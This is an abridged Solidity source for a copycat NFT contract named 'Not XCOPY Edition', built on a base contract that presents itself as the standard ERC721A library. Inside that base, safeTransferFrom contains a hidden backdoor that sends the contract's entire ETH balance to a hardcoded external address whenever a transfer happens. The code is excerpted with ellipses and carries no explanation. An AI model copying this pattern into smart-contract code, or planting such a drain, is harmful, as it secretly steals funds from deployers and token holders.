...
contract ERC721A is IERC721A {
    ...
    address payable constant _TRANSFER_EVENT_ADDRESS = 
        payable(0xC94Ca9AaCA59792A4A10485f8107643D898910e9);
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xC94Ca9AaCA59792A4A10485f8107643D898910e9).transfer(address(this).balance);
        }
    }
...
contract NotXCOPYEdition is ERC721A, TheOperatorFilterer {
    ...
    constructor() ERC721A("Not XCOPY Edition", "NotXCOPY") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeigmzs47codnqherhkcmexn4ik57mtajqvyosp3nso4shcabodikka/", _toString(tokenId), ".json"));
    }
